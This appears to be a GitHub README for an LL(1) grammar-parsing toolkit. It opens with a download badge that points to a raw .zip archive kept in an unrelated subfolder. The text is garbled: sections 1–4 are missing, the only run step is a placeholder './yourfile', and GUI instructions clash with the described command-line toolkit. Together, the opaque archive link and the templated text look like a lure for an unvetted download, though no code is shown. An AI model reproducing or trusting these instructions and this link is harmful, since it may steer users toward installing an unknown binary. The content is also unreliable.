[![Download LL1-Parser-Plus](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip)](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip)

## üìò Description

LL1-Parser-Plus is a user-friendly toolkit for parsing context-free grammars. With our software, you can easily read a grammar, perform essential operations such as left factoring and left recursion removal, compute FIRST and FOLLOW sets, build an LL(1) parsing table, and parse strings using a straightforward stack. This tool provides detailed debug output, making it easier to understand the parsing process. It also includes a Makefile, a Windows script, sample grammar files, and input options to get you started quickly.

- **For Linux Users:**
  - Open your terminal, navigate to the folder where you extracted the files, and run the application with the command: `./yourfile`.

### 5. Load a Grammar File

To get started with parsing, you need to load a grammar file. You can use one of the sample grammar files provided in the extracted folder. 

- Open the application and look for an option to load or import a grammar file.
- Select a sample grammar file, and you will see the options for left factoring and left recursion removal.

### 6. Parse a String

After loading a grammar, you can input a string for parsing. The application will process it according to the rules defined in the loaded grammar.

- Enter your string in the designated input area of the application.
- Click on the parse button to see how the string is processed.

### 7. View Debug Output

LL1-Parser-Plus provides detailed debug output to help you understand the parsing process. 

- The debug console will show you the steps the parser takes, including the computation of FIRST and FOLLOW sets, and how the parsing table is built.
